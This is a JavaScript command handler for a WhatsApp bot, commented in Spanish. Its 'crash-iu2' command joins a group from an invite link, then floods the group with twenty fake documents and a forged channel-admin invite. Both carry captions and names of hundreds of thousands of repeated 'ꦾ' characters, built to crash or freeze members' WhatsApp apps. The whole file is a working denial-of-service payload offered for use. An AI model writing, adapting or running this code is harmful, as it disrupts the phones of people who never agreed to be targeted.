let handler = async (m, { conn, text }) => {
  const ownerNumber = '527447800928@s.whatsapp.net'; // 🔁 Reemplaza con tu número real
  const botNumber = conn.user?.jid || '';
  const sender = m.sender;

  if (sender !== ownerNumber && sender !== botNumber) {
    return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el número del bot.', m);
  }

  if (!text || !text.includes('whatsapp.com')) {
    return m.reply('😿 Debes proporcionar el enlace del grupo.\nEjemplo: .crash-iu2 https://chat.whatsapp.com/XXXX', m);
  }

  const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
  if (!match) return m.reply('😡 Enlace inválido.');

  const inviteCode = match[1];
  let groupId;

  try {
    groupId = await conn.groupAcceptInvite(inviteCode);
  } catch (e) {
    groupId = `120363${inviteCode}@g.us`;
  }

  // Parte 1: Enviar 20 documentos traba invisibles
  const descripcionBase = 'ꦾ';
  const descripcionFinal = (descripcionBase.repeat(90000)).trim();

  for (let i = 0; i < 20; i++) {
    const contenidoInvisible = '\u200E'.repeat(5000) + i;
    const fakeDoc = Buffer.from(contenidoInvisible);
    const fileName = `🔥𝗧𝗢𝗕𝗜🔥_${i + 1}`.repeat(2);

    await conn.sendMessage(groupId, {
      document: fakeDoc,
      fileName,
      mimetype: 'application/msword',
      caption: descripcionFinal
    });
  }

  // Parte 2: Enviar la falsa invitación de canal
  const travas = 'ꦾ'.repeat(90000);

  await conn.relayMessage(groupId, {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363282786345717@newsletter",
      newsletterName: "🗣🗣🗣🗣" + travas + travas + travas,
      jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
      caption: "༺⃢🔥𝑇𝑂𝐵𝐼🔥⃢༻ ²⁰²⁴",
      inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
    }
  }, {});

  await conn.sendMessage(m.chat, { text: `🦊 Enviado correctamente al grupo.` }, { quoted: m });
};

handler.command = ['crash-iu2'];
handler.tags = ['fake', 'grupo'];
handler.help = ['crash-iu2 <enlace del grupo>'];

export default handler;